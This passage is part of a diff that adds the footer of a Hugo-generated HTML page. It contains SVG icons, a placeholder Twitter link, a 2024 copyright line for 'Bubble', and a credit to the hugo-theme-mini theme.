L45.3315807,40.2784283 Z" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="your-twitter-link" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2024 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Bubble
+    
+    </div>
+
+    
+      <div class="powerby">
+        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
+      </div>
+    
+</footer>
+
+
+
+  </body>
+</html>
